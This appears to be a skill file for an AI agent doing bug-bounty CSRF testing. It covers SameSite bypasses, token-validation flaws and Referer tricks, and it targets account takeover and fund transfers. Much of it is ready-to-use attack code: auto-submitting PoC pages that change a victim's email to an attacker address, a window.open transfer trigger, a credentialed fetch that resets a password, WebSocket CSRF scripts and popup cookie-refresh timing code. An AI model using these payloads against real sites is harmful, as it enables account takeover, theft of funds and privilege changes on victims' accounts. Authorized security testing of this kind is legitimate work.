---
name: csrf-testing
description: "Advanced CSRF hunting — SameSite Lax/Strict bypass, JSON CSRF via text/plain, _method override, 120-second Chrome Lax window, subdomain cookie injection, WebSocket CSRF, Referer suppression, popup-based cookie refresh. Use when testing state-changing endpoints, JSON APIs, or OAuth/SSO flows with cookie-based auth."
---

# Advanced CSRF Techniques

## Crown Jewel Targets

- **Account settings endpoints** (email change, password change, 2FA disable) — CSRF → full ATO chain (Critical bounty)
- **Financial platforms** — fund transfer, payment authorization, billing address change via CSRF
- **Admin panels** with cookie-based auth — CSRF on admin actions (user delete, permission grant, config change)
- **OAuth/SSO applications** with SameSite=None cookies — cross-origin state changes via credentialed fetch
- **WebSocket-based applications** — WS connections send cookies regardless of SameSite, bypassing all CSRF protections
- **Applications with `_method` override** (Laravel/Rails/Symfony) — GET request treated as POST, bypasses SameSite=Lax
- **Fresh SSO/OAuth login flows** — 120-second Chrome Lax grace period on new cookies → time-limited CSRF window

## Attack Surface Signals

- **Cookie attributes**: `SameSite=None` (vulnerable), no SameSite attribute (Lax by default but 120s grace), `SameSite=Lax` (GET bypass needed)
- **Response headers**: Missing `X-Frame-Options`, no CSRF token in forms, `Set-Cookie` without `SameSite=Strict`
- **Request patterns**: State-changing POST without CSRF token, JSON body with `Content-Type: application/json`, `_method=POST` in query params
- **Tech stack signals**: Rails (`authenticity_token`), Django (`csrfmiddlewaretoken`), Laravel (`_token`), Spring (`_csrf`)
- **JS bundle patterns**: `csrf`, `xsrf`, `anti-forgery`, `_method`, `method_override`
- **Positive indicators**: Request succeeds when CSRF token removed entirely, token not bound to session, Referer not validated

## Why 45% Accept Rate

CSRF is heavily reported but most are rejected because:
- SameSite=Lax is default in modern browsers (kills basic CSRF)
- JSON content-type triggers CORS preflight (blocks cross-origin POST)
- Programs reject CSRF on non-state-changing endpoints
- Missing impact demonstration (just "no CSRF token" = rejected)

**Only report if**: bypasses SameSite + actual state-changing action + working PoC.

## Detection

```bash
# Check SameSite cookie attribute
curl -sI https://target.com/login -c - | grep -i "set-cookie"
# Look for: SameSite=None (vulnerable), no SameSite (Lax by default in Chrome)

# Check CSRF token presence
curl -s https://target.com/settings | grep -iE "(csrf|_token|authenticity)"

# Check if JSON endpoints accept form-encoded
curl -X POST https://target.com/api/settings \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "email=test@evil.com"
```

## Bypass Techniques

### 1. JSON CSRF (no preflight needed)
```html
<!-- If server accepts text/plain with JSON body -->
<form action="https://target.com/api/change-email" method="POST" enctype="text/plain">
  <input name='{"email":"attacker@evil.com","x":"' value='"}' type="hidden">
  <input type="submit" value="Click me">
</form>
<!-- Sends body: {"email":"attacker@evil.com","x":"="} -->
```

### 2. SameSite=Lax bypass via GET
```html
<!-- Lax allows GET with top-level navigation -->
<!-- If target accepts state changes via GET (misconfigured) -->
<a href="https://target.com/api/delete-account?confirm=true">Click for prize</a>

<!-- Auto-trigger via window.open (top-level navigation) -->
<script>window.open("https://target.com/api/transfer?to=attacker&amount=1000")</script>
```

### 3. SameSite=Lax + method override
```html
<!-- Some frameworks accept _method override -->
<form action="https://target.com/api/settings?_method=PUT" method="GET">
  <input name="email" value="attacker@evil.com" type="hidden">
  <input type="submit">
</form>
```

### 4. Subdomain cookie injection (SameSite bypass)
```
# If attacker controls subdomain (via takeover or XSS):
# Cookies from subdomain count as "same-site"
# evil.target.com can set cookies for target.com
# → Override CSRF token cookie with known value
```

### 5. CORS misconfiguration + CSRF chain
```html
<!-- If CORS allows attacker origin with credentials -->
<script>
fetch("https://target.com/api/change-password", {
  method: "POST",
  credentials: "include",
  headers: {"Content-Type": "application/json"},
  body: JSON.stringify({new_password: "hacked123"})
});
</script>
```

### 6. WebSocket CSRF (no SameSite protection for WS)
```html
<!-- WebSocket connections send cookies regardless of SameSite -->
<script>
var ws = new WebSocket("wss://target.com/ws");
ws.onopen = () => ws.send(JSON.stringify({action: "change_email", email: "evil@attacker.com"}));
</script>
```

### 7. CSRF token validation flaws (test all five before assuming tokens hold)

Tokens fail in predictable ways. Each of these is a separate probe against the same endpoint, and each needs a clean baseline (unmodified request succeeds) to be meaningful.

**Validation depends on the request method.** Resubmit the state-changing request as `GET` with the token removed. Frameworks routinely validate tokens on POST only, and many endpoints accept either verb. If GET works without a token, the CSRF defence does not exist for that endpoint.

**Validation depends on the token being present.** Delete the parameter entirely — not blank it, delete it. Code written as `if (request.getParameter("csrf") != null) validate()` skips validation when the parameter is absent, while a blank or wrong value is correctly rejected. Test omission and empty-string separately; they hit different branches.

**Token is not tied to the user session.** Log in as your second account, capture a valid token, then use it in a request carrying the first account's session cookie. If the server keeps a global pool of issued tokens rather than binding each to a session, an attacker simply fetches their own token and uses it against the victim.

**Token tied to a non-session cookie.** Some apps validate that the token matches a `csrfKey` cookie that is separate from the session cookie. Since the two are independent, a token/`csrfKey` pair from your own session stays valid against the victim's session — provided you can also set that cookie in the victim's browser, which a subdomain cookie-injection or a CRLF `Set-Cookie` makes possible.

**Token simply duplicated in a cookie (double-submit).** If validation is only "body token == cookie token", supply both yourself: any value works. This requires cookie-setting on the victim, the same prerequisite as above, so pair it with `crlf-injection` or a sibling-subdomain foothold.

## PoC Template (State-Changing Action)

```html
<!DOCTYPE html>
<html>
<body>
<h1>CSRF PoC — Email Change</h1>
<p>This page changes the victim's email when visited while authenticated.</p>
<form id="csrf" action="https://target.com/api/account/email" method="POST">
  <input name="email" value="attacker@evil.com" type="hidden">
  <input name="confirm" value="true" type="hidden">
</form>
<script>document.getElementById("csrf").submit();</script>
</body>
</html>
```

## Impact Requirements

Must demonstrate actual state change:
- **Account takeover**: Change email/password → take over account
- **Financial**: Transfer funds, change billing
- **Permission**: Change role, add admin
- **Data modification**: Delete content, modify settings

**Rejected examples**: CSRF on login (login CSRF rarely accepted), CSRF on logout, CSRF on newsletter subscribe.

## Triage Checklist

- [ ] SameSite cookie attribute checked and documented
- [ ] CSRF protection mechanism (token, referer, origin) tested
- [ ] State-changing action identified and demonstrated
- [ ] PoC works in latest Chrome AND Firefox
- [ ] Impact is meaningful (not just login/logout CSRF)
- [ ] Not mitigated by CORS (preflight blocks the request)

## PortSwigger Academy — Advanced Techniques

### Token Removal Bypass
- Delete the CSRF token parameter entirely from the request (not just empty value — remove the field)
- Some servers skip CSRF validation when the token parameter is absent, only validating when present
- Test both: empty token value (`csrf=`) AND completely missing parameter

### Token-Session Decoupling
- Swap your own valid CSRF token into the victim's request — if the server maintains a global token pool rather than per-session binding, any valid token works for any session
- Obtain token from attacker's own session, embed in CSRF exploit targeting victim

### Double-Submit Cookie Bypass via Cookie Injection
- When CSRF uses double-submit pattern (cookie value must match form parameter), plant a cookie via:
  - CRLF injection in a response header
  - Subdomain XSS/cookie injection (child domain sets parent domain cookie)
- Send matching value in both the planted cookie and the form parameter

### SameSite Lax Bypass via _method Override
- Symfony/Laravel/Rails support `_method=POST` parameter — a GET request with `_method=POST` is treated as POST by the framework
- GET requests pass SameSite=Lax checks (top-level navigation), but the framework processes them as POST
- `<form method="GET" action="https://target.com/settings?_method=POST">`

### SameSite Strict Bypass via Client-Side Redirect Gadgets
- Find an on-site JavaScript redirect (e.g., `/post/comment/confirmation?postId=../settings`) that performs client-side navigation
- First request from attacker site → on-site page (same-site context established) → JS redirect to sensitive endpoint
- The second hop is same-site, so Strict cookies are attached

### 120-Second Chrome Default Lax Window
- Fresh `Set-Cookie` without explicit `SameSite` attribute: Chrome applies Lax by default BUT allows POST for the first 120 seconds
- If victim recently got a new session cookie (e.g., after OAuth/SSO login), cross-site POST CSRF works within this 2-minute window

### Popup-Based Cookie Refresh
- Force a fresh session cookie via popup, then exploit the 120-second Lax window:
- `window.onclick = () => { window.open('https://target.com/login/sso'); setTimeout(csrfAttack, 3000); }`
- Popup triggers SSO → new cookie issued → main page sends CSRF POST within Lax grace period

### Sibling Domain CSRF
- XSS on any subdomain (e.g., `blog.target.com`) bypasses all SameSite restrictions for `target.com`
- Subdomains are "same-site" — requests from XSS'd subdomain carry SameSite=Strict cookies
- Chain: subdomain XSS → trigger state-changing request on main domain with full cookie access

### Referer Suppression
- `<meta name="referrer" content="no-referrer">` in CSRF exploit page — suppresses Referer header entirely
- Many servers only validate Referer when it's present, accepting requests with no Referer

### Referer Substring Confusion
- If server checks `Referer` contains `vulnerable-website.com`, host exploit at `vulnerable-website.com.evil.com`
- Or use URL path/query tricks: `https://evil.com/csrf?vulnerable-website.com`
- Substring matching on Referer is a common weak validation pattern

## Operator Notes (Battle-Tested)

1. **Always check SameSite attribute first**: `curl -sI https://target.com/login -c - | grep -i set-cookie`. If `SameSite=Strict`, CSRF is dead unless you find a subdomain XSS to chain. If `SameSite=None` or missing, proceed with standard CSRF testing.
2. **Token removal beats token forgery**: Before trying to predict or forge CSRF tokens, simply remove the token parameter entirely. Many servers only validate the token when it is present — absent token passes validation.
3. **PoC must work in latest Chrome AND Firefox**: Triagers test in both browsers. Chrome's SameSite=Lax default and Firefox's handling differ. A PoC that only works in one browser is often rejected.
4. **Playwright is mandatory for CSRF verification** (): curl-only CSRF testing is incomplete. Open the PoC HTML in Playwright, confirm cookies are sent, verify the state change occurred. Save a screenshot of the result.
5. **WebSocket CSRF is the most underexplored vector**: WS connections send cookies regardless of SameSite. If the target has WebSocket endpoints for state-changing actions, CSRF protection is likely absent. Test with a simple HTML page that opens a cross-origin WS connection.

## Related Skills & Chains

| When | Go to |
|------|-------|
| Need subdomain XSS to bypass SameSite=Strict | `xss-testing` → `references/prototype-pollution.md` |
| CSRF + clickjacking chain (multi-click attack) | `clickjacking-testing` |
| WebSocket endpoint found, test CSRF on WS | `websocket-testing` |
| CORS misconfiguration enables credentialed cross-origin requests | `cors-testing` |
| CSRF on OAuth redirect → token theft | `open-redirect`, `oauth-testing` |
| Need to discover state-changing endpoints | `api-security-testing`, `hidden-param-discovery` |
